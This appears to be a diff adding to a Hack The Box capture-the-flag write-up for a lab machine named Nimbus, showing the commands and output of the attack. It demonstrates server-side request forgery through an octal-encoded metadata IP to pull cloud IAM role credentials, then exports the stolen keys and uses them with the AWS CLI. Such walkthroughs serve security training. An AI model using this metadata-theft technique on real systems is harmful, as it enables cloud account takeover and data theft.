@@ -211,3 +211,81 @@ a { color: #66d9ef; }
 url:
 
 ```
+
+``` bash
+
+
+❯ python3 url.py
+url: http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?test=test.yaml
+Response:
+ <!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>Preview — Nimbus</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: ui-monospace, Menlo, monospace; background: #1a1a1a; color: #d0d0d0; line-height: 1.5; padding: 2rem; max-width: 720px; margin: 0 auto; }
+h1 { font-size: 1.4rem; margin-bottom: 0.25rem; color: #e6db74; }
+.tag { color: #8b949e; font-size: 0.875rem; margin-bottom: 2rem; }
+nav { border-top: 1px solid #333; border-bottom: 1px solid #333; padding: 0.75rem 0; margin-bottom: 2rem; }
+nav a { color: #66d9ef; text-decoration: none; margin-right: 2rem; }
+.panel { border: 1px solid #333; padding: 1rem; margin-bottom: 1rem; }
+.err { border-left: 3px solid #f92672; padding-left: 1rem; color: #f92672; }
+.ok { border-left: 3px solid #a6e22e; padding-left: 1rem; color: #a6e22e; margin-bottom: 1rem; padding: 0.5rem 1rem; font-size: 0.875rem; }
+.meta { color: #666; font-size: 0.75rem; margin-bottom: 0.75rem; }
+pre { background: #0d0d0d; padding: 0.75rem; overflow-x: auto; max-height: 400px; font-size: 0.8rem; color: #c0c0c0; border: 1px solid #222; }
+h3 { font-size: 0.95rem; color: #a6e22e; margin: 1rem 0 0.5rem; }
+a { color: #66d9ef; }
+</style>
+</head>
+<body>
+<h1>Preview</h1>
+<div class="tag"><a href="/jobs">← submit another</a></div>
+<div class="panel">
+<div class="meta">Fetched: <code>http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?test=test.yaml</code> · HTTP 200</div>
+<h3>Raw response</h3><pre>{
+  &#34;Code&#34;: &#34;Success&#34;,
+  &#34;LastUpdated&#34;: &#34;2026-07-10T21:38:56Z&#34;,
+  &#34;Type&#34;: &#34;AWS-HMAC&#34;,
+  &#34;AccessKeyId&#34;: &#34;ASIAQX4PG7L2K9M3N5R8&#34;,
+  &#34;SecretAccessKey&#34;: &#34;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#34;,
+  &#34;Token&#34;: &#34;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#34;,
+  &#34;Expiration&#34;: &#34;2026-07-11T03:38:56Z&#34;
+}</pre>
+<h3>Parsed</h3><pre>{&#39;Code&#39;: &#39;Success&#39;, &#39;LastUpdated&#39;: &#39;2026-07-10T21:38:56Z&#39;, &#39;Type&#39;: &#39;AWS-HMAC&#39;, &#39;AccessKeyId&#39;: &#39;ASIAQX4PG7L2K9M3N5R8&#39;, &#39;SecretAccessKey&#39;: &#39;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#39;, &#39;Token&#39;: &#39;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#39;, &#39;Expiration&#39;: &#39;2026-07-11T03:38:56Z&#39;}</pre>
+</div>
+
+</body>
+</html>
+url:
+
+
+```
+
+``` bash
+❯ export AWS_ACCESS_KEY_ID='ASIAQX4PG7L2K9M3N5R8'
+
+❯ export AWS_SECRET_ACCESS_KEY='bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs'
+
+❯ export AWS_SESSION_TOKEN='IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM'
+
+❯ export AWS_DEFAULT_REGION='us-east-1'
+
+❯ export AWS_ENDPOINT_URL="http://aws.nimbus.htb"
+
+```
+
+``` bash
+❯ aws sts get-caller-identity --endpoint-url $AWS_ENDPOINT_URL
+╭─ ~/hacking/ctf/htb/hard/nimbus/scripts                                                                     ✔ │ 13s ─╮
+╰─                                                                                                                   ─╯
+```
+
+``` bash
+
+``` json
+
+{
+    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
+    "Account": "847219365028",
+    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
+}
